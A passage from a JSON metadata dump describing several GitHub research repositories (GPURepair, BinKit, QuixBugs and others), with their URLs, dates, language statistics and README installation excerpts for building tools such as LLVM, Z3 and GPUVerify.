                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3324
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "780": {
        "filename": "cs17resch01003_gpurepair_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/cs17resch01003/gpurepair",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "### Building from Source on Ubuntu 18.04 \n1. Install [Python 3](https://www.python.org/) and the [psutil](https://pypi.org/project/psutil/) module\n```bash\nsudo apt-get update\nsudo apt install python3\nsudo apt install python3-pip\n\npip3 install psutil\n```\n2. Install [Mono](https://www.mono-project.com/). Latest instructions can be found at [https://www.mono-project.com/download/stable/#download-lin](https://www.mono-project.com/download/stable/#download-lin)\n```bash\nsudo apt install gnupg ca-certificates\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF\necho \"deb https://download.mono-project.com/repo/ubuntu stable-bionic main\" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list\nsudo apt update\n\nsudo apt install mono-devel\n```\n3. Install the [Git](https://git-scm.com/) client to download the source code and install [cmake](https://cmake.org/) for building the tools from source. Latest instructions for installing cmake can be found at [https://apt.kitware.com](https://apt.kitware.com). We need [Nuget](https://www.nuget.org/) as well for restoring packages used in the build of GPUVerify\n```bash\nwget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2>/dev/null | gpg --dearmor - | sudo tee /etc/apt/trusted.gpg.d/kitware.gpg >/dev/null\nsudo apt-add-repository 'deb https://apt.kitware.com/ubuntu/ bionic main'\nsudo apt-get update\n\nsudo apt install git\nsudo apt install cmake\nsudo apt install nuget\n```\n4. Download the source code of LLVM and Clang from the [llvm-project 6.x](https://github.com/llvm/llvm-project/tree/release/6.x) repository and compile it\n```bash\nexport BUILD_ROOT=/path/to/build\n\n# download the source code\nexport LLVM_RELEASE=release/6.x\nmkdir -p ${BUILD_ROOT}/llvm_and_clang\ncd ${BUILD_ROOT}/llvm_and_clang\ngit clone https://github.com/llvm/llvm-project.git src/6.x\n\ncd src/6.x\ngit checkout ${LLVM_RELEASE}\ncp -r ${BUILD_ROOT}/llvm_and_clang/src/6.x/clang ${BUILD_ROOT}/llvm_and_clang/src/6.x/llvm/tools/clang\n\n# generate the build files\nmkdir -p ${BUILD_ROOT}/llvm_and_clang/build\ncd ${BUILD_ROOT}/llvm_and_clang/build\ncmake -D CMAKE_BUILD_TYPE=Release -D LLVM_TARGETS_TO_BUILD=NVPTX ../src/6.x/llvm\n\n# start the build (recommended value of N is the number of cores)\nmake -jN\n```\n5. Download the source code of libclc from the [llvm-project 8.x](https://github.com/llvm/llvm-project/tree/release/8.x) repository and compile it\n```bash\n# download the source code\ncd ${BUILD_ROOT}/llvm_and_clang\ngit clone https://github.com/llvm/llvm-project.git src/8.x\n\ncd src/8.x\ngit checkout release/8.x\n\n# copy the libclc source code into a different folder\nmkdir -p ${BUILD_ROOT}/libclc\ncd ${BUILD_ROOT}/libclc\ncp -r ${BUILD_ROOT}/llvm_and_clang/src/8.x/libclc ${BUILD_ROOT}/libclc/src\n\n# build the source code\ncd ${BUILD_ROOT}/libclc/src\npython3 ./configure.py --with-llvm-config=${BUILD_ROOT}/llvm_and_clang/build/bin/llvm-config \\\n\t--with-cxx-compiler=c++ \\\n\t--prefix=${BUILD_ROOT}/libclc/install \\\n\tnvptx-- nvptx64--\nmake\n\nmake install\n```\n6. Download the source code of the [Z3 SMT Solver](https://github.com/Z3Prover/z3/tree/z3-4.6.0) and compile it\n```bash\n# download the source code\nexport Z3_RELEASE=z3-4.6.0\ncd ${BUILD_ROOT}\ngit clone https://github.com/Z3Prover/z3.git\n\n# generate the build files\ncd ${BUILD_ROOT}/z3\ngit checkout -b ${Z3_RELEASE} ${Z3_RELEASE}\npython3 scripts/mk_make.py\n\n# start the build (recommended value of N is the number of cores)\ncd build\nmake -jN\n\n# install the library and create a symbolic link\nsudo make install\nln -s z3 z3.exe\n```\n7. Download the source code of the [Bugle](https://github.com/mc-imperial/bugle) and compile it\n```bash\n# download the source code\ncd ${BUILD_ROOT}\ngit clone https://github.com/mc-imperial/bugle.git ${BUILD_ROOT}/bugle/src\n\n# generate the build files\nmkdir ${BUILD_ROOT}/bugle/build\ncd ${BUILD_ROOT}/bugle/build\ncmake -D LLVM_CONFIG_EXECUTABLE=${BUILD_ROOT}/llvm_and_clang/build/bin/llvm-config \\\n\t-D CMAKE_BUILD_TYPE=Release \\\n\t-D LIBCLC_DIR=${BUILD_ROOT}/libclc/install \\\n\t../src\n\n# start the build (recommended value of N is the number of cores)\nmake -jN\n```\n8. Download the source code of the [GPUVerify](https://github.com/mc-imperial/gpuverify) and compile it\n```bash\n# download the source code\ncd ${BUILD_ROOT}\ngit clone https://github.com/mc-imperial/gpuverify.git\n\n# compile the code\ncd ${BUILD_ROOT}/gpuverify\nnuget restore GPUVerify.sln\nmsbuild /p:Configuration=Release GPUVerify.sln\n\n# copy the config file and change the \"rootDir\" variable to ${BUILD_ROOT}\ncd ${BUILD_ROOT}/gpuverify\ncp gvfindtools.templates/gvfindtools.dev.py gvfindtools.py\nvim gvfindtools.py\n\n# test the build\ncd ${BUILD_ROOT}/gpuverify\npython3 ./gvtester.py --write-pickle run.pickle testsuite\n```\n9. Download the source code of the [GPURepair](https://github.com/cs17resch01003/gpurepair) and compile it\n```bash\n# download the source code\ncd ${BUILD_ROOT}\ngit clone https://github.com/cs17resch01003/gpurepair.git\n\n# compile the code\ncd ${BUILD_ROOT}/gpurepair/src\nmsbuild /p:Configuration=Release /p:Platform=x86 GPURepair.sln\nmsbuild /p:Configuration=Release /p:Platform=x86 GPURepair.ReportGenerator.sln\n\n# edit the config file and change the \"rootDir\" variable to ${BUILD_ROOT}\ncd ${BUILD_ROOT}/gpurepair/src/Toolchain\nvim gvfindtools.py\n\n# test the build\ncd ${BUILD_ROOT}/gpurepair/src/Toolchain\npython3 ./grtester.py ../../tests/testsuite\n```\n \nGPURepair follows the same execution syntax as GPUVerify. Below is a CUDA kernel that has a data race. This kernel is located at *${BUILD_ROOT}/gpurepair/tests/testsuite/Bugged/race/kernel.cu*\n```cpp\n#include <cuda.h>\n__global__ void race (int* A)\n{\n    int idx = blockDim.x * blockIdx.x + threadIdx.x;\n    int temp = A[idx + 1];\n    A[idx] = temp;\n}\n```\nTo repair this kernel, run the following command.\n```bash\ncd ${BUILD_ROOT}/gpurepair/src/Toolchain\npython3 ./GPURepair.py ../../tests/testsuite/Bugged/race/kernel.cu --blockDim=32 --gridDim=1\n```\nThis command repairs the kernel and prints the number of changes that are required to correct this kernel. The changes that are needed are written to a summary file at the same location where the kernel is.\n```bash\ncat ../../tests/testsuite/Bugged/race/kernel.summary\n# prints the line number where the barrier needs to be inserted to fix the data race\n```\n \nThe repaired kernel will look like below.\n```cpp\n#include <cuda.h>\n__global__ void race (int* A)\n{\n    int idx = blockDim.x * blockIdx.x + threadIdx.x;\n    int temp = A[idx + 1];\n    __syncthreads();\n    A[idx] = temp;\n}\n```\n \n",
                    "original_header": "GPURepair Documentation"
                },
                "confidence": 0.9952636377363966,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/cs17resch01003/gpurepair/main/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-27T19:14:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-17T10:13:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 283235
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 209692
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 207482
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 92617
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 69277
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 38438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 9088
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Boogie",
                    "name": "Boogie",
                    "type": "Programming_language",
                    "size": 1909
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "781": {
        "filename": "qibinhang_MwT_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/qibinhang/MwT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-05T04:02:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T11:54:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 174685
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "782": {
        "filename": "RobustNLP_TestIC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RobustNLP/TestIC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-08T14:32:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-14T06:00:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 194732
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1598
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "783": {
        "filename": "SoftSec-KAIST_binkit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SoftSec-KAIST/BinKit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can download the source code of GNU packages of your interest as below.\n- Please check step 1 before running the command.\n- You must give *ABSOLUTE PATH* for `--base_dir`.\n\n```bash\n$ source scripts/env.sh\n$ python gnu_compile_script.py \\\n    --base_dir \"/home/dongkwan/binkit/dataset/gnu\" \\\n    --num_jobs 8 \\\n    --whitelist \"config/whitelist.txt\" \\\n    --download\n```\n\nYou can compile only the packages or compiler options of your interest as below.\n\n```bash\n$ source scripts/env.sh\n$ python gnu_compile_script.py \\\n    --base_dir \"/home/dongkwan/binkit/dataset/gnu\" \\\n    --num_jobs 8 \\\n    --config \"config/normal.yml\" \\\n    --whitelist \"config/whitelist.txt\"\n```\n\nYou can check the compiled binaries as below.\n\n```bash\n$ source scripts/env.sh\n$ python compile_checker.py \\\n    --base_dir \"/home/dongkwan/binkit/dataset/gnu\" \\\n    --num_jobs 8 \\\n    --config \"config/normal.yml\"\n```\n\nFor more details, please check `compile_packages.sh`\n",
                    "type": "Text_excerpt",
                    "original_header": "4-1. Build dataset (manual)",
                    "parent_header": [
                        "How to use"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In particular, BinKit now includes GCC and Clang versions up to 11 and 13,\nrespectively. Currently, a total of 6 optimization options (O0, O1, O2, O3, Os,\nOfast) are supported. see the [Currently supported compile\noptions](https://github.com/SoftSec-KAIST/BinKit#currently-supported-compile-options)\nsection below for more detailed options. \nIn Binkit 2.0 dataset, the gsl package misses 8 binaries with Ofast option due\nto compiler bugs. See the [Missing binaries](https://github.com/SoftSec-KAIST/BinKit#Missing-binaries)\npart of the [Issues](https://github.com/topcue/tmp#issues) section for more\ninformation.\n \n",
                    "original_header": "BinKit 2.0"
                },
                "confidence": 0.9941626318777681,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The original dataset includes 1,352 distinct combinations of compiler options of\n8 architectures, 5 optimization levels, and 13 compilers. It includes 243,128\nbinaries. We tested this code in Ubuntu 16.04. \n",
                    "original_header": "BinKit 1.0 (paper version)"
                },
                "confidence": 0.9975993795467578,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can download our dataset and toolchain as below. The link will be changed to\n`git-lfs` soon. \n[//]: # (Cloning this repository also downloads below pre-compiled dataset and toolchain\nwith `git-lfs`. Please use `GIT_LFS_SKIP_SMUDGE=1` to skip the download.)\n \n",
                    "original_header": "Pre-compiled dataset and toolchain"
                },
                "confidence": 0.9988495003438267,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- x86_32\n- x86_64\n- arm_32 (little endian)\n- arm_64 (little endian)\n- mips_32 (little endian)\n- mips_64 (little endian)\n- mipseb_32 (big endian)\n- mipseb_64 (big endian)\n \n",
                    "original_header": "Architecture"
                },
                "confidence": 0.9319791368405038,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- gcc\n  - gcc-4.9.4\n  - gcc-5.5.0\n  - gcc-6.4.0\n  - gcc-6.5.0\n  - gcc-7.3.0\n  - gcc-8.2.0\n  - gcc-8.5.0\n  - gcc-9.4.0\n  - gcc-10.3.0\n  - gcc-11.2.0\n- clang\n  - clang-4.0.0\n  - clang-5.0.2\n  - clang-6.0.1\n  - clang-7.0.1\n  - clang-8.0.0\n  - clang-9.0.1\n  - clang-10.0.1\n  - clang-11.0.1\n  - clang-12.0.1\n  - clang-13.0.0\n- clang-obfus\n  - clang-obfus-fla (Obfuscator-LLVM - FLA)\n  - clang-obfus-sub (Obfuscator-LLVM - SUB)\n  - clang-obfus-bcf (Obfuscator-LLVM - BCF)\n  - clang-obfus-all (Obfuscator-LLVM - FLA + SUB + BCF)\n \n",
                    "original_header": "Compilers"
                },
                "confidence": 0.9999999268067681,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We ran all our experiments on a server equipped with four Intel Xeon E7-8867v4\n2.40 GHz CPUs (total 144 cores), 896 GB DDR4 RAM, and 4 TB SSD. We setup Ubuntu\n16.04 on the server.\n \n",
                    "original_header": "Tested environment"
                },
                "confidence": 0.9995658419775376,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In Binkit 2.0 dataset, the gsl package misses 8 binaries with Ofast option due\nto compiler bugs. Clang-8 and clang-9 induce compiler hang bug when compiling\nthe gsl package for 32bit ARM with Ofast option. We reported this issue to\nbug-gsl and llvm-project respectively. However, bug-gsl did not reply, and the\nllvm-project replied that these versions are not currently supported. The bug\nreporting links are respectively as follows:\n[bug-gsl](https://lists.gnu.org/archive/html/bug-gsl/2023-02/msg00000.html),\n[llvm-project](https://github.com/llvm/llvm-project/issues/60692)\n \n",
                    "original_header": "Missing binaries"
                },
                "confidence": 0.9999994520473843,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftSec-KAIST/binkit/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-21T11:08:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T15:57:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 59425
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25414
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "784": {
        "filename": "KDEGroup_RefBERT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/KDEGroup/RefBERT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The required environment is included in `environments.txt`.\n \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9993647260064735,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KDEGroup/RefBERT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-24T15:18:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-18T02:22:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 101620
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "785": {
        "filename": "CUHK-Shenzhen-SE_RetromorphicTesting_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CUHK-Shenzhen-SE/RetromorphicTesting",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-10-04T08:26:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-12T14:14:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 26270
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "786": {
        "filename": "disa-lab_BlockchainEmpiricalEASE2022_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/disa-lab/BlockchainEmpiricalEASE2022",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Interactions happened between external and contributing users-\n- collaboration-users-commits.csv\n- collaboration-users-issues.csv\n- collaboration-users-prs.csv \n",
                    "original_header": "Generated files"
                },
                "confidence": 0.9931414351939152,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/disa-lab/BlockchainEmpiricalEASE2022/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-24T16:39:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-30T18:53:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "787": {
        "filename": "CelloCorgi_ICSE_fNIRS2021_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CelloCorgi/ICSE_fNIRS2021",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-15T15:39:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-06-22T16:11:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 1006
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "788": {
        "filename": "mleoking_leotask_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mleoking/LeoTask",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2014-09-20T13:33:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-13T23:52:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 791497
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1879
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 76
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "789": {
        "filename": "terryyz_DataAug4Code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/terryyz/DataAug4Code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Authors: <a href=\"https://terryyz.github.io\">Terry Yue Zhuo</a>,\n\t\t\t  <a href=\"https://yangzhou6666.github.io/\">Zhou Yang</a>,\n\t\t\t  <a href=\"https://v587su.github.io/\">Zhensu Sun</a>,\n\t\t\t  <a href=\"https://scholar.google.com/citations?user=gFoSqqkAAAAJ&hl=en\">Yufei Wang</a>,\n\t\t\t  <a href=\"http://lilicoding.github.io/\">Li Li</a>,\n              <a href=\"https://xiaoningdu.github.io/\">Xiaoning Du</a>,\n\t\t\t  <a href=\"https://scholar.google.com/citations?user=0vCxuH4AAAAJ&hl=en\">Zhenchang Xing</a>,\n\t\t\t  <a href=\"http://www.mysmu.edu/faculty/davidlo/\">David Lo</a> \n",
                    "original_header": "Data Augmentation Approaches for Source Code Models"
                },
                "confidence": 0.9999999999978968,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/terryyz/DataAug4Code/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-31T12:45:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T14:47:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "790": {
        "filename": "zfj1998_SO_Title_Generation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zfj1998/Copying-enhanced-CodeBERT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-07-02T08:22:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-17T02:56:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 108187
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "791": {
        "filename": "jkoppel_QuixBugs_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jkoppel/QuixBugs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Simply clone the repo. \n\n    git clone https://github.com/jkoppel/QuixBugs\n    \nThe Java programs are already compiled (see `*.class` files in `java_programs`). Note the all java programs are in the same package called `java_programs`. The utility class `JavaDeserialization.java` requires you to download the external library Gson.\n\nAll Python is written in Python3.\n\nTo run both defective versions of a program against their tests, as well as the corrected Python version, use the test driver:\n\n> python3 tester.py _program\\_name_\n\nOutput is printed for visual comparison.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation &amp; Usage"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/jkoppel/QuixBugs/master/README.md"
            },
            {
                "result": {
                    "value": "There are JUnit tests in the `java_testcases/junit` folder for the Java version. Running `TestsGenerator.java` can regenerate them if needed.\n\nTo run these tests, you can use [Gradle](https://gradle.org/) tasks provided by the `build.gradle` file. First, install Gradle. Then,\n\n- `gradle test` can be used to run tests on the buggy programs (Runs JUnit tests from the `java_testcases/junit` folder);\n- `gradle crtTest` can be used to run tests on the correct programs (Runs JUnit tests from the `java_testcases/junit/crt_program` folder).\n\nIt is also possible to run tests for a single program with the `--tests` option:\n\n```bash\n$ gradle test --tests KNAPSACK_TEST\n\n> Task :test\n\njava_testcases.junit.KNAPSACK_TEST > test_1 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:14\n\njava_testcases.junit.KNAPSACK_TEST > test_3 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:26\n\njava_testcases.junit.KNAPSACK_TEST > test_4 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:32\n\njava_testcases.junit.KNAPSACK_TEST > test_5 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:38\n\njava_testcases.junit.KNAPSACK_TEST > test_6 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:44\n\njava_testcases.junit.KNAPSACK_TEST > test_7 FAILED\n    java.lang.AssertionError at KNAPSACK_TEST.java:50\n\n10 tests completed, 6 failed\n```\n\n```bash\n$ gradle crtTest --tests KNAPSACK_TEST\n\nBUILD SUCCESSFUL in 4s\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Using JUnit tests",
                    "parent_header": [
                        "Installation &amp; Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/jkoppel/QuixBugs/master/README.md"
            },
            {
                "result": {
                    "value": "For the Python version, there are [pytest](https://pytest.org/) tests for each program in the `python_testcases` folder. To run them, install pytest using `pip` and then, from the root of the repository, call `pytest` to run tests for a single program or target the whole directory to run every test inside it.\n\n```bash\npip install pytest\npytest python_testcases/test_quicksort.py\n# Or\npytest python_testcases\n```\n\nTests work for both buggy and correct versions of programs. The default test calls the buggy version, but there is a custom `--correct` flag that uses the correct version of a program.\n\n```bash\npytest --correct python_testcases\n```\n\nMost of the tests run fast and finish in less than a second, but two tests are slow. The first one is the last test case of the `knapsack` program, and the second one is the fourth test case of the `levenshtein` program. The default behavior skips both these tests. For the `knapsack` test case, using the `--runslow` pytest option will include it in the running tests. However, the `levenshtein` test case is always skipped since it takes a long time to pass and is ignored by the JUnit tests as well.\n\n```bash\n$ pytest --correct --runslow python_testcases/test_knapsack.py\n\ncollected 10 items\npython_testcases/test_knapsack.py ..........     [100%]\n\n========== 10 passed in 240.97s (0:04:00) ========== \n```\n\n```bash\n$ pytest --correct python_testcases/test_knapsack.py\n\ncollected 10 items\npython_testcases/test_knapsack.py ..........     [100%]\n\n========== 9 passed, 1 skipped in 0.08s ========== \n```\n\nSome tests, such as the `bitcount` ones, need a timeout. pytest itself doesn't have a timeout mechanism, but there is a [pytest-timeout](https://github.com/pytest-dev/pytest-timeout) plugin for it. Installing pytest-timeout adds additional options to the `pytest` CLI so, for example, to timeout `bitcount` tests after five seconds, you can do like this:\n\n```bash\npip install pytest-timeout\npytest --timeout=5 python_testcases/test_bitcount.py\n```\nMake sure to check pytest-timeout's documentation to understand its caveats and how it handles timeouts on different systems.\n\nThere is also a [pytest-xdist](https://github.com/pytest-dev/pytest-xdist) plugin that runs tests in parallel and can be used similarly to the timeout plugin.\n",
                    "type": "Text_excerpt",
                    "original_header": "Using pytest tests",
                    "parent_header": [
                        "Installation &amp; Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/jkoppel/QuixBugs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-07-16T02:10:04Z",
                    "type": "Date"
                },
                "confidence": 1,
